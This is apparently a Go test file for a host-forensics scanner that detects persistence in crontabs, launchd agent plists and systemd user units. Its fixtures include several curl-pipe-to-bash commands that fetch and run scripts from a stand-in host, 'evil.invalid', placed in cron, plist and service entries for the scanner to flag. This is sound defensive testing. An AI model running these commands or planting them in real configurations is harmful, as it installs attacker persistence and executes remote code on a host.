package hostforensics

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParseCrontabOutput(t *testing.T) {
	crontab := `# m h dom mon dow command
0 * * * * /home/u/scripts/check.sh
*/15 * * * * curl -sSL https://evil.invalid/x.sh | bash
@reboot /home/u/bin/sync
# commented out line should not match:
# */5 * * * * curl bad.invalid | bash
`
	got := parseCrontabOutput([]byte(crontab), "crontab")
	ids := map[string]int{}
	for _, f := range got {
		ids[f.VulnID]++
	}
	if ids["HOST-PERSISTENCE-CRON"] != 3 {
		t.Errorf("expected 3 cron entries, got %d (ids: %v)", ids["HOST-PERSISTENCE-CRON"], ids)
	}
	if ids["HOST-PERSISTENCE-SUSPICIOUS"] != 1 {
		t.Errorf("expected 1 suspicious cron entry, got %d", ids["HOST-PERSISTENCE-SUSPICIOUS"])
	}
}

func TestScanPersistenceDirLaunchd(t *testing.T) {
	home := t.TempDir()
	agents := filepath.Join(home, "Library", "LaunchAgents")
	if err := os.MkdirAll(agents, 0o755); err != nil {
		t.Fatal(err)
	}
	// One innocuous-looking plist
	if err := os.WriteFile(filepath.Join(agents, "com.example.legit.plist"),
		[]byte(`<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.legit</string></dict></plist>`), 0o644); err != nil {
		t.Fatal(err)
	}
	// One with a suspicious payload string embedded
	if err := os.WriteFile(filepath.Join(agents, "com.example.bad.plist"),
		[]byte(`<?xml version="1.0"?><plist><dict><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>curl -fsSL https://evil.invalid/install.sh | bash</string></array></dict></plist>`), 0o644); err != nil {
		t.Fatal(err)
	}

	got := scanPersistenceDir([]string{agents}, ".plist", "HOST-PERSISTENCE-LAUNCHD", "launchd agent", "launchd")
	ids := map[string]int{}
	for _, f := range got {
		ids[f.VulnID]++
	}
	if ids["HOST-PERSISTENCE-LAUNCHD"] != 2 {
		t.Errorf("expected 2 launchd entries, got %d", ids["HOST-PERSISTENCE-LAUNCHD"])
	}
	if ids["HOST-PERSISTENCE-SUSPICIOUS"] != 1 {
		t.Errorf("expected 1 suspicious launchd plist, got %d", ids["HOST-PERSISTENCE-SUSPICIOUS"])
	}
}

func TestScanPersistenceDirSystemd(t *testing.T) {
	home := t.TempDir()
	dir := filepath.Join(home, ".config", "systemd", "user")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "myservice.service"),
		[]byte("[Unit]\nDescription=My service\n[Service]\nExecStart=/usr/bin/myservice"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "bad.service"),
		[]byte("[Service]\nExecStart=/bin/sh -c 'curl -fsSL https://evil.invalid/x.sh | bash'"), 0o644); err != nil {
		t.Fatal(err)
	}
	got := scanPersistenceDir([]string{dir}, ".service", "HOST-PERSISTENCE-SYSTEMD-USER", "systemd user unit", "systemd")
	ids := map[string]int{}
	for _, f := range got {
		ids[f.VulnID]++
	}
	if ids["HOST-PERSISTENCE-SYSTEMD-USER"] != 2 {
		t.Errorf("expected 2 systemd entries, got %d", ids["HOST-PERSISTENCE-SYSTEMD-USER"])
	}
	if ids["HOST-PERSISTENCE-SUSPICIOUS"] != 1 {
		t.Errorf("expected 1 suspicious systemd unit, got %d", ids["HOST-PERSISTENCE-SUSPICIOUS"])
	}
}
